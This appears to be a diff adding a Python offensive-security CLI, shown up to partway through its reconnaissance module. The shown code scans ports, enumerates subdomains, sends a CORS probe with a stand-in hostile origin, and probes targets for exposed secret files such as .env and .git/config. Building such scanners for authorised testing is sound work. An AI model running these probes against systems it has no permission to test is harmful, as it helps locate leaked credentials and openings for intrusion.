@@ -1,0 +1,2002 @@
+     1→#!/usr/bin/env python3
+     2→"""
+     3→ReconPro UNIFIED CLI — The Convergence
+     4→=======================================
+     5→All offensive modules fused into one entity.
+     6→One target. One encounter. Seven blades.
+     7→
+     8→  ┌─ RECON          13-category surface reconnaissance
+     9→  ├─ AUTH BYPASS    15 auth bypass techniques
+    10→  ├─ CHAIN HUNTER   SSRF + redirect chain hunting
+    11→  ├─ BOT HUNTER     C2 / bot infrastructure detection
+    12→  ├─ GORGON ULTRA   15-stage AI red team
+    13→  ├─ OBLIVION       23-stage analytical dissolution
+    14→  └─ VIBESEC        AI/vibe-coding vulnerability benchmark
+    15→
+    16→Subcommands:
+    17→    python3 reconpro.py auth login <api-key>    Store API credentials
+    18→    python3 reconpro.py auth status              Show auth status
+    19→    python3 reconpro.py auth logout              Remove credentials
+    20→
+    21→Usage:
+    22→    python3 reconpro.py <target>
+    23→    python3 reconpro.py <target> --modules recon,auth,vibesec
+    24→    python3 reconpro.py <target> --all --output report.json --upload
+    25→    python3 reconpro.py <target> --insecure --dry-run
+    26→    python3 reconpro.py --list
+    27→    python3 reconpro.py vibesec <target>        Quick vibe-coding audit
+    28→"""
+    29→import argparse
+    30→import hashlib
+    31→import json
+    32→import os
+    33→import re
+    34→import secrets
+    35→import shlex
+    36→import socket
+    37→import ssl
+    38→import subprocess
+    39→import sys
+    40→import time
+    41→import uuid
+    42→import urllib.error
+    43→import urllib.parse
+    44→import urllib.request
+    45→import hmac
+    46→from datetime import datetime
+    47→from typing import Any, Dict, List, Optional, Tuple
+    48→from threading import Lock
+    49→
+    50→# Rich for advanced visuals
+    51→from rich.console import Console, Group
+    52→from rich.panel import Panel
+    53→from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
+    54→from rich.table import Table
+    55→from rich.text import Text
+    56→from rich.align import Align
+    57→from rich.columns import Columns
+    58→from rich.rule import Rule
+    59→from rich.tree import Tree
+    60→from rich.live import Live
+    61→from rich.layout import Layout
+    62→
+    63→console = Console(width=120)
+    64→
+    65→# ── Global Config ──────────────────────────────────────────────────────────
+    66→
+    67→AUDIT_LOG_PATH = "/home/z/my-project/download/reconpro_audit.log"
+    68→_AUDIT_FAIL_WARNED = False
+    69→
+    70→
+    71→class _Config:
+    72→    """Runtime configuration flags — set once from CLI args."""
+    73→    verify_tls: bool = True
+    74→    insecure: bool = False
+    75→    confirm: bool = False
+    76→    dry_run: bool = False
+    77→    quiet: bool = False
+    78→    json_output: bool = False
+    79→
+    80→
+    81→CONFIG = _Config()
+    82→
+    83→# ── m5: Thread-safe rate limiter ──────────────────────────────────────────
+    84→
+    85→class _RateLimiter:
+    86→    """Token-bucket rate limiter — safe for concurrent use.
+    87→
+    88→    Default: 10 requests per second. Use throttle.acquire() before any
+    89→    network call; it blocks until a token is available.
+    90→    """
+    91→
+    92→    def __init__(self, max_per_second: float = 10.0):
+    93→        self._rate = max_per_second
+    94→        self._min_interval = 1.0 / max_per_second
+    95→        self._lock = Lock()
+    96→        self._last = 0.0
+    97→
+    98→    def acquire(self) -> None:
+    99→        """Block until we're allowed to make the next request."""
+   100→        with self._lock:
+   101→            now = time.monotonic()
+   102→            elapsed = now - self._last
+   103→            if elapsed < self._min_interval:
+   104→                time.sleep(self._min_interval - elapsed)
+   105→            self._last = time.monotonic()
+   106→
+   107→
+   108→RATE_LIMITER = _RateLimiter(max_per_second=10.0)
+   109→
+   110→# ── n1: IPv6 range classification ──────────────────────────────────────────
+   111→
+   112→_IPV6_RESERVED_PREFIXES = ("fe80:", "fc", "fd", "::1", "::ffff", "2001:db8:", "::", "ff")
+   113→_IPV6_LINK_LOCAL_RE = re.compile(r'^fe80:', re.IGNORECASE)
+   114→_IPV6_UNIQUE_LOCAL_RE = re.compile(r'^(fc|fd)', re.IGNORECASE)
+   115→_IPV6_LOOPBACK_RE = re.compile(r'^::1$')
+   116→_IPV6_MAPPED_V4_RE = re.compile(r'^::ffff:', re.IGNORECASE)
+   117→_IPV6_DOC_RE = re.compile(r'^2001:db8:', re.IGNORECASE)
+   118→_IPV6_MULTICAST_RE = re.compile(r'^ff[0-9a-f]', re.IGNORECASE)
+   119→
+   120→
+   121→def classify_ipv6(addr: str) -> str:
+   122→    """Classify an IPv6 address. Returns: 'global', 'link_local', 'unique_local',
+   123→    'loopback', 'mapped_v4', 'documentation', 'multicast', 'unspecified'."""
+   124→    if addr == "::":
+   125→        return "unspecified"
+   126→    if _IPV6_LOOPBACK_RE.match(addr):
+   127→        return "loopback"
+   128→    if _IPV6_LINK_LOCAL_RE.match(addr):
+   129→        return "link_local"
+   130→    if _IPV6_UNIQUE_LOCAL_RE.match(addr):
+   131→        return "unique_local"
+   132→    if _IPV6_MAPPED_V4_RE.match(addr):
+   133→        return "mapped_v4"
+   134→    if _IPV6_DOC_RE.match(addr):
+   135→        return "documentation"
+   136→    if _IPV6_MULTICAST_RE.match(addr):
+   137→        return "multicast"
+   138→    return "global"
+   139→
+   140→# ══════════════════════════════════════════════════════════════════════════════
+   141→# RECONPRO UNIFIED IDENTITY
+   142→# ══════════════════════════════════════════════════════════════════════════════
+   143→
+   144→RECONPRO_NAME = "ReconPro UNIFIED"
+   145→RECONPRO_TAGLINE = "Six Blades. One Target. One Verdict."
+   146→RECONPRO_VERSION = "reconpro-unified-v1.0"
+   147→RECONPRO_SIGNATURE = "X-R3c0nPr0-Un1f13d-S1x-Bl4d3s-0n3-T4rg3t-2026"
+   148→
+   149→BANNER = r"""
+   150→██████╗ ███████╗ ██████╗██╗  ██╗███████╗██████╗ ███████╗██████╗ ██████╗ ██╗    ██╗
+   151→██╔══██╗██╔════╝██╔════╝██║  ██║██╔════╝██╔══██╗██╔════╝██╔════╝██║██╗ ██╔╝
+   152→██████╔╝█████╗  ██║     ███████║█████╗  ██████╔╝█████╗  ██║     ██╔╝██╗██║
+   153→██╔═══╝ ██╔══╝  ██║     ██╔══██║██╔══╝  ██╔══██╗██╔══╝  ██║     █████╔╝██║
+   154→██║     ███████╗╚██████╗██║  ██║███████╗██║  ██║███████╗╚██████╗██╔╝██╗██║
+   155→╚═╝     ╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝
+   156→              S E V E N   B L A D E S .   O N E   T A R G E T .   O N E   V E R D I C T.
+   157→"""
+   158→
+   159→MODULES = [
+   160→    {"id": "recon",    "name": "RECON",         "desc": "13-category surface reconnaissance",   "color": "cyan"},
+   161→    {"id": "auth",     "name": "AUTH BYPASS",   "desc": "15 auth bypass techniques",            "color": "yellow"},
+   162→    {"id": "chain",    "name": "CHAIN HUNTER",  "desc": "SSRF + redirect chain hunting",        "color": "magenta"},
+   163→    {"id": "bot",      "name": "BOT HUNTER",    "desc": "C2 / bot infrastructure detection",    "color": "red"},
+   164→    {"id": "gorgon",   "name": "GORGON ULTRA",  "desc": "15-stage AI red team",                 "color": "bright_red"},
+   165→    {"id": "oblivion", "name": "OBLIVION",      "desc": "23-stage analytical dissolution",       "color": "bright_magenta"},
+   166→    {"id": "vibesec",  "name": "VIBESEC",       "desc": "AI/vibe-coding vulnerability benchmark", "color": "bright_green"},
+   167→]
+   168→
+   169→RECONPRO_TAGLINE = "Seven Blades. One Target. One Verdict."
+   170→
+   171→# ══════════════════════════════════════════════════════════════════════════════
+   172→# HELPERS
+   173→# ══════════════════════════════════════════════════════════════════════════════
+   174→
+   175→def run_argv(argv: list, timeout: int = 8) -> Tuple[str, str]:
+   176→    """Execute a pre-parsed argv list without any shell interpretation."""
+   177→    try:
+   178→        r = subprocess.run(argv, shell=False, capture_output=True, text=True, timeout=timeout)
+   179→        return r.stdout.strip(), r.stderr.strip()
+   180→    except Exception:
+   181→        return "", ""
+   182→
+   183→
+   184→def run(cmd: str, timeout: int = 8) -> Tuple[str, str]:
+   185→    """Execute a command string safely via shlex.split — no /bin/sh spawned."""
+   186→    if CONFIG.dry_run:
+   187→        audit_log("subprocess.skip", detail=f"dry-run: {cmd[:120]}")
+   188→        return "", ""
+   189→    try:
+   190→        argv = shlex.split(cmd)
+   191→    except ValueError as e:
+   192→        audit_log("subprocess.shlex.error", status=type(e).__name__, detail=str(e))
+   193→        return "", ""
+   194→    if not argv:
+   195→        return "", ""
+   196→    return run_argv(argv, timeout=timeout)
+   197→
+   198→def http_probe(url: str, method: str = "GET", body: Optional[bytes] = None,
+   199→               headers: Optional[Dict[str, str]] = None, timeout: int = 8) -> Dict[str, Any]:
+   200→    """Hardened single HTTP layer — all modules delegate through this."""
+   201→    RATE_LIMITER.acquire()  # m5: thread-safe rate limiting
+   202→    h = {
+   203→        "User-Agent": "ReconPro-Unified/1.0 (Six-Blades-One-Target; +https://reconpro.security)",
+   204→        "X-ReconPro-Signature": RECONPRO_SIGNATURE,
+   205→        "Accept": "application/json,text/plain,*/*",
+   206→    }
+   207→    if headers:
+   208→        h.update(headers)
+   209→    req = urllib.request.Request(url, data=body, method=method, headers=h)
+   210→    try:
+   211→        ctx = ssl.create_default_context()
+   212→        if CONFIG.insecure:
+   213→            ctx.check_hostname = False
+   214→            ctx.verify_mode = ssl.CERT_NONE
+   215→        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
+   216→            raw = resp.read(8192)
+   217→            return {
+   218→                "ok": True, "status": resp.status, "reason": resp.reason,
+   219→                "headers": dict(resp.headers.items()),
+   220→                "body": raw.decode("utf-8", errors="replace")[:8192],
+   221→            }
+   222→    except urllib.error.HTTPError as e:
+   223→        try:
+   224→            raw = e.read(8192)
+   225→            body_str = raw.decode("utf-8", errors="replace")[:8192]
+   226→        except Exception:
+   227→            body_str = ""
+   228→        return {
+   229→            "ok": False, "status": e.code, "reason": e.reason,
+   230→            "headers": dict(e.headers.items()) if e.headers else {},
+   231→            "body": body_str,
+   232→        }
+   233→    except Exception as e:
+   234→        return {"ok": False, "status": 0, "reason": str(e), "headers": {}, "body": ""}
+   235→
+   236→# ── C3: JSON Lines audit log (injection-immune) ──────────────────────────
+   237→
+   238→def audit_log(event: str, status: str = "ok", detail: str = "") -> None:
+   239→    """Append a JSON Lines record to the audit log. Injection-immune via json.dumps."""
+   240→    global _AUDIT_FAIL_WARNED
+   241→    record = {
+   242→        "ts": datetime.utcnow().isoformat() + "Z",
+   243→        "event": event,
+   244→        "status": status,
+   245→        "detail": detail,
+   246→    }
+   247→    try:
+   248→        os.makedirs(os.path.dirname(AUDIT_LOG_PATH) or ".", exist_ok=True)
+   249→        with open(AUDIT_LOG_PATH, "a") as f:
+   250→            f.write(json.dumps(record, ensure_ascii=False, separators=(",", ":")) + "\n")
+   251→    except Exception:
+   252→        if not _AUDIT_FAIL_WARNED:
+   253→            _AUDIT_FAIL_WARNED = True
+   254→            sys.stderr.write(f"[reconpro] WARNING: audit log write failed for {AUDIT_LOG_PATH}\n")
+   255→
+   256→# ── M1: Confirm gate ──────────────────────────────────────────────────────
+   257→
+   258→def _confirm_proceed(label: str) -> bool:
+   259→    """Prompt user for confirmation before destructive operations.
+   260→    Only activates when CONFIG.confirm is True AND not in dry-run mode.
+   261→    """
+   262→    if not CONFIG.confirm or CONFIG.dry_run:
+   263→        return True
+   264→    from rich.panel import Panel as _Panel
+   265→    from rich.text import Text as _Text
+   266→    try:
+   267→        console.print(_Panel(
+   268→            _Text(f"About to execute: {label}", style="bold yellow"),
+   269→            border_style="yellow",
+   270→            title="[bold]CONFIRM[/bold]",
+   271→            title_align="left",
+   272→            padding=(1, 2),
+   273→        ))
+   274→        answer = input("proceed? > ").strip().lower()
+   275→        return answer in ("y", "yes", "ok")
+   276→    except (EOFError, KeyboardInterrupt):
+   277→        return False
+   278→
+   279→# ── VibeSec Grade Mapping ─────────────────────────────────────────────
+   280→
+   281→VIBESEC_GRADE_MAP = [
+   282→    (90, "A+", "bright_green"),
+   283→    (80, "A",  "green"),
+   284→    (65, "B",  "yellow"),
+   285→    (50, "C",  "red"),
+   286→    (35, "D",  "bright_red"),
+   287→    (0,  "F",  "bold bright_red"),
+   288→]
+   289→
+   290→VIBESEC_SENSITIVE_PATHS = [
+   291→    "/.env", "/.env.local", "/.env.production", "/.env.development",
+   292→    "/.git/config", "/.git/HEAD", "/.gitignore",
+   293→    "/docker-compose.yml", "/docker-compose.yaml",
+   294→    "/config.json", "/config.yaml", "/config.yml",
+   295→    "/package.json", "/.npmrc",
+   296→    "/vercel.json", "/netlify.toml",
+   297→    "/firebase.json", "/firestore.rules",
+   298→    "/.vscode/settings.json", "/.idea/workspace.xml",
+   299→]
+   300→
+   301→VIBESEC_API_PATHS = [
+   302→    "/api/webhooks", "/api/trpc", "/api/v1/admin", "/api/v1/users",
+   303→    "/api/v1/config", "/api/internal", "/api/debug",
+   304→    "/api/graphql", "/api/stripe/webhook", "/api/upload",
+   305→    "/admin", "/admin/login", "/dashboard",
+   306→]
+   307→
+   308→VIBESEC_ANON_KEY_PATTERNS = [
+   309→    ("supabase", re.compile(r'[\w-]*\.supabase\.co', re.I)),
+   310→    ("firebase", re.compile(r'[\w-]*\.firebaseapp\.com', re.I)),
+   311→    ("aws-s3", re.compile(r's3\.amazonaws\.com|s3-\w+-\d+\.amazonaws\.com', re.I)),
+   312→    ("cloudflare-r2", re.compile(r'[\w-]+\.r2\.cloudflarestorage\.com', re.I)),
+   313→    ("vercel-blob", re.compile(r'blob\.vercel-storage\.com', re.I)),
+   314→]
+   315→
+   316→
+   317→# ══════════════════════════════════════════════════════════════════════════════
+   318→# CLI AUTH & TELEMETRY
+   319→# ══════════════════════════════════════════════════════════════════════════════
+   320→
+   321→CREDENTIALS_DIR = os.path.expanduser("~/.reconpro")
+   322→CREDENTIALS_FILE = os.path.join(CREDENTIALS_DIR, "credentials.json")
+   323→TELEMETRY_ENDPOINT = "https://api.reconpro.io/api/v1/telemetry/upload"
+   324→
+   325→
+   326→def _load_credentials() -> Dict[str, str]:
+   327→    """Load stored credentials from ~/.reconpro/credentials.json."""
+   328→    try:
+   329→        if os.path.exists(CREDENTIALS_FILE):
+   330→            with open(CREDENTIALS_FILE, "r") as f:
+   331→                data = json.load(f)
+   332→                if isinstance(data, dict) and "api_key" in data:
+   333→                    return data
+   334→    except Exception as e:
+   335→        audit_log("credentials.load.error", status=type(e).__name__, detail=str(e)[:120])
+   336→    return {}
+   337→
+   338→
+   339→def _save_credentials(data: Dict[str, str]) -> bool:
+   340→    """Save credentials to ~/.reconpro/credentials.json with restrictive perms."""
+   341→    try:
+   342→        os.makedirs(CREDENTIALS_DIR, mode=0o700, exist_ok=True)
+   343→        fd = os.open(CREDENTIALS_FILE, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
+   344→        with os.fdopen(fd, "w") as f:
+   345→            json.dump(data, f, indent=2)
+   346→        audit_log("credentials.saved", detail="api_key stored")
+   347→        return True
+   348→    except Exception as e:
+   349→        audit_log("credentials.save.error", status=type(e).__name__, detail=str(e)[:120])
+   350→        return False
+   351→
+   352→
+   353→def _delete_credentials() -> bool:
+   354→    """Remove stored credentials."""
+   355→    try:
+   356→        if os.path.exists(CREDENTIALS_FILE):
+   357→            os.remove(CREDENTIALS_FILE)
+   358→            audit_log("credentials.deleted", detail="api_key removed")
+   359→        return True
+   360→    except Exception as e:
+   361→        audit_log("credentials.delete.error", status=type(e).__name__, detail=str(e)[:120])
+   362→        return False
+   363→
+   364→
+   365→def cmd_auth_login(api_key: str) -> None:
+   366→    """Authenticate and store API key locally."""
+   367→    if not api_key or len(api_key) < 8:
+   368→        console.print("[red]Invalid API key. Must be at least 8 characters.[/]")
+   369→        return
+   370→    if not _save_credentials({"api_key": api_key, "stored_at": datetime.utcnow().isoformat() + "Z"}):
+   371→        console.print("[red]Failed to save credentials.[/]")
+   372→        return
+   373→    console.print(f"[green]Authenticated.[/] API key stored at {CREDENTIALS_FILE}")
+   374→    console.print(f"[dim]Key prefix: {api_key[:8]}...{api_key[-4:]}[/]")
+   375→
+   376→
+   377→def cmd_auth_status() -> None:
+   378→    """Show current authentication status."""
+   379→    creds = _load_credentials()
+   380→    if creds and "api_key" in creds:
+   381→        key = creds["api_key"]
+   382→        stored = creds.get("stored_at", "unknown")
+   383→        console.print(f"[green]Authenticated.[/]")
+   384→        console.print(f"  Key prefix: [bold]{key[:8]}...{key[-4:]}[/]")
+   385→        console.print(f"  Stored at: [dim]{stored}[/]")
+   386→        console.print(f"  File: [dim]{CREDENTIALS_FILE}[/]")
+   387→    else:
+   388→        console.print("[yellow]Not authenticated.[/] No API key found.")
+   389→        console.print(f"  Run: [cyan]reconpro.py auth login <api-key>[/]")
+   390→
+   391→
+   392→def cmd_auth_logout() -> None:
+   393→    """Remove stored credentials."""
+   394→    if _delete_credentials():
+   395→        console.print("[green]Logged out.[/] Credentials removed.")
+   396→    else:
+   397→        console.print("[red]Failed to remove credentials.[/]")
+   398→
+   399→
+   400→def _sign_report(report: Dict[str, Any]) -> str:
+   401→    """HMAC-SHA256 sign a report for tamper-proof telemetry."""
+   402→    creds = _load_credentials()
+   403→    api_key = creds.get("api_key", "")
+   404→    canonical = json.dumps(report, sort_keys=True, separators=(",", ":"), ensure_ascii=False)
+   405→    signature = hmac.new(api_key.encode(), canonical.encode(), hashlib.sha256).hexdigest()
+   406→    return signature
+   407→
+   408→
+   409→def _upload_telemetry(report: Dict[str, Any]) -> bool:
+   410→    """POST signed report to telemetry endpoint. Returns True on success."""
+   411→    creds = _load_credentials()
+   412→    if not creds.get("api_key"):
+   413→        audit_log("telemetry.skip", detail="no api_key configured")
+   414→        return False
+   415→    signature = _sign_report(report)
+   416→    payload = json.dumps({
+   417→        "report": report,
+   418→        "signature": signature,
+   419→        "api_key_prefix": creds["api_key"][:8],
+   420→    }).encode()
+   421→    try:
+   422→        RATE_LIMITER.acquire()
+   423→        req = urllib.request.Request(
+   424→            TELEMETRY_ENDPOINT,
+   425→            data=payload,
+   426→            method="POST",
+   427→            headers={
+   428→                "Content-Type": "application/json",
+   429→                "User-Agent": f"ReconPro-Unified/{RECONPRO_VERSION}",
+   430→                "X-ReconPro-Signature": RECONPRO_SIGNATURE,
+   431→                "Authorization": f"Bearer {creds['api_key']}",
+   432→            },
+   433→        )
+   434→        ctx = ssl.create_default_context()
+   435→        if CONFIG.insecure:
+   436→            ctx.check_hostname = False
+   437→            ctx.verify_mode = ssl.CERT_NONE
+   438→        with urllib.request.urlopen(req, timeout=15, context=ctx) as resp:
+   439→            if resp.status < 300:
+   440→                audit_log("telemetry.upload.ok", detail=f"status={resp.status}")
+   441→                return True
+   442→            else:
+   443→                audit_log("telemetry.upload.error", detail=f"status={resp.status}")
+   444→                return False
+   445→    except Exception as e:
+   446→        audit_log("telemetry.upload.error", status=type(e).__name__, detail=str(e)[:120])
+   447→        return False
+   448→
+   449→
+   450→def _save_local_fallback(report: Dict[str, Any]) -> str:
+   451→    """Save report locally when upload fails — graceful offline fallback."""
+   452→    os.makedirs("/home/z/my-project/download", exist_ok=True)
+   453→    safe_host = _safe_filename(report.get("target", "unknown"))
+   454→    ts = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
+   455→    path = f"/home/z/my-project/download/reconpro_pending_{safe_host}_{ts}.json"
+   456→    try:
+   457→        with open(path, "w") as f:
+   458→            json.dump(report, f, indent=2, default=str)
+   459→        audit_log("telemetry.fallback.saved", detail=path)
+   460→        return path
+   461→    except Exception as e:
+   462→        audit_log("telemetry.fallback.error", status=type(e).__name__, detail=str(e)[:120])
+   463→        return ""
+   464→
+   465→
+   466→def upload_report(report: Dict[str, Any]) -> None:
+   467→    """Attempt telemetry upload with graceful offline fallback."""
+   468→    console.print(f"\n  [cyan]Telemetry:[/] Attempting upload to {TELEMETRY_ENDPOINT}...")
+   469→    if _upload_telemetry(report):
+   470→        console.print(f"  [green]Upload successful.[/] Report synced to cloud.")
+   471→    else:
+   472→        local_path = _save_local_fallback(report)
+   473→        if local_path:
+   474→            console.print(f"  [yellow]Upload failed (offline/no-key).[/] Saved locally: [bold]{local_path}[/]")
+   475→            console.print(f"  [dim]Re-upload later with: reconpro.py <target> --upload[/]")
+   476→        else:
+   477→            console.print(f"  [red]Upload failed and local save failed. Report may be lost.[/]")
+   478→
+   479→
+   480→def generate_encounter_id(host: str) -> str:
+   481→    """Generate a globally unique encounter ID. Uses uuid4 — no collision window."""
+   482→    raw = uuid.uuid4().hex[:12].upper()
+   483→    return f"RPU-{raw}"
+   484→
+   485→# ══════════════════════════════════════════════════════════════════════════════
+   486→# MODULE 1: RECON — 13-category surface reconnaissance
+   487→# ══════════════════════════════════════════════════════════════════════════════
+   488→
+   489→def module_recon(host: str) -> Dict[str, Any]:
+   490→    """13-category surface reconnaissance."""
+   491→    findings: List[Dict[str, Any]] = []
+   492→    categories_run: List[str] = []
+   493→
+   494→    def add(title, severity, category, description, evidence):
+   495→        findings.append({
+   496→            "title": title, "severity": severity, "category": category,
+   497→            "description": description, "evidence": evidence, "asset": host,
+   498→        })
+   499→
+   500→    # 1. DNS
+   501→    categories_run.append("DNS Enumeration")
+   502→    out, _ = run(f"dig +short +time=3 +tries=1 {host} A")
+   503→    a_records = [l.strip() for l in out.split('\n') if l.strip() and re.match(r'^\d+\.\d+', l)]
+   504→    if a_records:
+   505→        add(f"DNS A Record — {len(a_records)} IPv4 address(es)", "info", "dns",
+   506→            f"Domain resolves to {len(a_records)} IPv4: {', '.join(a_records[:5])}",
+   507→            f"A: {', '.join(a_records[:5])}")
+   508→    out, _ = run(f"dig +short +time=3 +tries=1 {host} AAAA")
+   509→    aaaa = [l.strip() for l in out.split('\n') if l.strip()]
+   510→    if aaaa:
+   511→        v6_classes = {classify_ipv6(a) for a in aaaa}
+   512→        private_count = sum(1 for c in v6_classes if c != "global")
+   513→        scope_note = f" ({len(v6_classes)} scope classes: {', '.join(sorted(v6_classes))})" if len(v6_classes) > 1 else ""
+   514→        if private_count:
+   515→            add(f"DNS AAAA — {len(aaaa)} IPv6, {private_count} non-global{scope_note}", "medium", "dns",
+   516→                f"IPv6: {', '.join(aaaa[:3])}", f"AAAA: {aaaa[0]}")
+   517→        else:
+   518→            add(f"DNS AAAA — {len(aaaa)} global IPv6{scope_note}", "info", "dns",
+   519→                f"IPv6: {', '.join(aaaa[:3])}", f"AAAA: {aaaa[0]}")
+   520→    out, _ = run(f"dig +noall +answer +time=3 +tries=1 {host} MX")
+   521→    mx = [l.strip() for l in out.split('\n') if 'MX' in l]
+   522→    if mx:
+   523→        add(f"MX Records — {len(mx)} mail server(s)", "info", "dns", f"{len(mx)} mail servers", "; ".join(mx[:3]))
+   524→    out, _ = run(f"dig +noall +answer +time=3 +tries=1 {host} NS")
+   525→    ns = [l.strip() for l in out.split('\n') if 'NS' in l]
+   526→    if ns:
+   527→        add(f"NS Records — {len(ns)} nameserver(s)", "info", "dns", f"{len(ns)} nameservers", "; ".join(ns[:3]))
+   528→    out, _ = run(f"dig +short +time=3 +tries=1 {host} TXT")
+   529→    txt_lines = [l for l in out.split('\n') if l.strip()]
+   530→    if txt_lines:
+   531→        spf = [t for t in txt_lines if 'spf' in t.lower()]
+   532→        add(f"TXT Records — {len(txt_lines)} ({len(spf)} SPF)", "info", "dns",
+   533→            f"{len(txt_lines)} TXT records, {len(spf)} SPF", "; ".join(txt_lines[:3]))
+   534→
+   535→    # 2. HTTP Headers
+   536→    categories_run.append("HTTP Security Headers")
+   537→    r = http_probe(f"https://{host}/")
+   538→    if r["status"]:
+   539→        hdrs = r["headers"]
+   540→        sec_headers = ["strict-transport-security", "content-security-policy", "x-frame-options",
+   541→                       "x-content-type-options", "referrer-policy", "permissions-policy"]
+   542→        present = [h for h in sec_headers if h in hdrs]
+   543→        missing = [h for h in sec_headers if h not in hdrs]
+   544→        for h in missing:
+   545→            add(f"Missing security header: {h}", "medium", "headers",
+   546→                f"The {h} header is not set. This leaves users vulnerable to specific client-side attacks.",
+   547→                f"Header {h} absent from response")
+   548→        for h in present:
+   549→            add(f"Security header present: {h}", "info", "headers",
+   550→                f"{h} is set: {hdrs[h][:80]}", f"{h}: {hdrs[h][:80]}")
+   551→        server = hdrs.get("server", "")
+   552→        if server:
+   553→            add(f"Server header disclosure: {server}", "low", "headers",
+   554→                f"Server software disclosed: {server}", f"Server: {server}")
+   555→        # Tech fingerprint
+   556→        for sig in ["cloudflare", "nginx", "apache", "gunicorn", "envoy", "istio", "aws", "gcp"]:
+   557→            if sig in json.dumps(hdrs).lower():
+   558→                add(f"Tech fingerprint: {sig}", "info", "headers", f"Signal {sig} detected in headers", sig)
+   559→
+   560→    # 3. TLS Certificate
+   561→    categories_run.append("TLS Certificate Analysis")
+   562→    try:
+   563→        ctx = ssl.create_default_context()
+   564→        with socket.create_connection((host, 443), timeout=5) as sock:
+   565→            with ctx.wrap_socket(sock, server_hostname=host) as ssock:
+   566→                cert = ssock.getpeercert()
+   567→                if cert:
+   568→                    subject = dict(x[0] for x in cert.get("subject", []))
+   569→                    issuer = dict(x[0] for x in cert.get("issuer", []))
+   570→                    not_after = cert.get("notAfter", "")
+   571→                    add(f"TLS Certificate — {subject.get('commonName', 'unknown')}", "info", "tls",
+   572→                        f"Issued by {issuer.get('commonName', 'unknown')}, expires {not_after}",
+   573→                        f"CN={subject.get('commonName', '')}, issuer={issuer.get('commonName', '')}")
+   574→    except Exception as e:
+   575→        add(f"TLS handshake failed: {str(e)[:60]}", "medium", "tls", str(e)[:100], str(e)[:100])
+   576→
+   577→    # 4. Subdomain enumeration (passive via crt.sh)
+   578→    categories_run.append("Subdomain Enumeration")
+   579→    try:
+   580→        r2 = http_probe(f"https://crt.sh/?q=%.{host}&output=json", timeout=10)
+   581→        if r2["status"] == 200 and r2["body"]:
+   582→            data = json.loads(r2["body"])
+   583→            subs = set()
+   584→            for d in data[:200]:
+   585→                name = d.get("name_value", "")
+   586→                for n in name.split('\n'):
+   587→                    if n.endswith(host) and '*' not in n:
+   588→                        subs.add(n.strip())
+   589→            if subs:
+   590→                add(f"Subdomain enumeration — {len(subs)} found via crt.sh", "info", "subdomain",
+   591→                    f"{len(subs)} unique subdomains discovered", "; ".join(list(subs)[:5]))
+   592→    except Exception as e:
+   593→        audit_log("recon.subdomain.error", status=type(e).__name__, detail=str(e)[:120])
+   594→
+   595→    # 5. Robots.txt
+   596→    categories_run.append("Robots.txt Analysis")
+   597→    r = http_probe(f"https://{host}/robots.txt")
+   598→    if r["status"] == 200 and r["body"]:
+   599→        lines = [l.strip() for l in r["body"].split('\n') if l.strip()]
+   600→        disallows = [l for l in lines if l.lower().startswith('disallow')]
+   601→        if disallows:
+   602→            add(f"robots.txt — {len(disallows)} Disallow rules", "info", "robots",
+   603→                f"{len(disallows)} paths disallowed", "; ".join(disallows[:5]))
+   604→
+   605→    # 6. Sitemap
+   606→    categories_run.append("Sitemap Analysis")
+   607→    r = http_probe(f"https://{host}/sitemap.xml")
+   608→    if r["status"] == 200 and r["body"]:
+   609→        urls = re.findall(r'<loc>([^<]+)</loc>', r["body"])
+   610→        if urls:
+   611→            add(f"sitemap.xml — {len(urls)} URLs", "info", "sitemap",
+   612→                f"{len(urls)} URLs exposed in sitemap", "; ".join(urls[:3]))
+   613→
+   614→    # 7. Common paths
+   615→    categories_run.append("Common Path Probing")
+   616→    for path in ["/.env", "/.git/config", "/wp-admin", "/admin", "/api", "/v1", "/.well-known/security.txt",
+   617→                 "/server-status", "/phpinfo.php", "/actuator", "/metrics"]:
+   618→        r = http_probe(f"https://{host}{path}", timeout=4)
+   619→        if r["status"] not in (0, 404) and r["status"] < 500:
+   620→            sev = "critical" if path in ["/.env", "/.git/config"] else ("high" if path in ["/wp-admin", "/admin"] else "info")
+   621→            add(f"Path exposed: {path} (HTTP {r['status']})", sev, "paths",
+   622→                f"{path} returned HTTP {r['status']}", f"GET {path} → {r['status']}")
+   623→
+   624→    # 8. Open ports (top 12)
+   625→    categories_run.append("Port Scan (top 12)")
+   626→    try:
+   627→        ip = socket.gethostbyname(host)
+   628→        for port in [21, 22, 25, 80, 443, 3306, 5432, 6379, 8080, 8443, 9200, 27017]:
+   629→            try:
+   630→                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+   631→                s.settimeout(1.5)
+   632→                result = s.connect_ex((ip, port))
+   633→                if result == 0:
+   634→                    add(f"Open port: {port}/tcp", "medium" if port in [21, 25, 3306, 5432, 6379, 9200, 27017] else "info",
+   635→                        "ports", f"Port {port}/tcp is open", f"{ip}:{port} OPEN")
+   636→                s.close()
+   637→            except Exception:
+   638→                pass
+   639→    except Exception:
+   640→        pass
+   641→
+   642→    # 9. Email security (DMARC, DKIM)
+   643→    categories_run.append("Email Security (DMARC/DKIM)")
+   644→    out, _ = run(f"dig +short +time=3 +tries=1 _dmarc.{host} TXT")
+   645→    if out:
+   646→        add(f"DMARC record present", "info", "email", f"DMARC: {out[:100]}", out[:100])
+   647→    else:
+   648→        add("DMARC record missing", "medium", "email", "No DMARC record found — domain vulnerable to email spoofing", "DMARC query empty")
+   649→
+   650→    # 10. CORS
+   651→    categories_run.append("CORS Analysis")
+   652→    r = http_probe(f"https://{host}/", headers={"Origin": "https://evil.example.com"})
+   653→    if r["status"]:
+   654→        acao = r["headers"].get("access-control-allow-origin", "")
+   655→        if acao == "*" or "evil" in acao:
+   656→            add("Wildcard / reflected CORS origin", "high", "cors",
+   657→                f"Access-Control-Allow-Origin: {acao} — allows arbitrary origins",
+   658→                f"ACAO: {acao}")
+   659→
+   660→    # 11. Cookie security
+   661→    categories_run.append("Cookie Security")
+   662→    if r["status"]:
+   663→        set_cookie = r["headers"].get("set-cookie", "")
+   664→        if set_cookie:
+   665→            issues = []
+   666→            if "secure" not in set_cookie.lower(): issues.append("missing Secure flag")
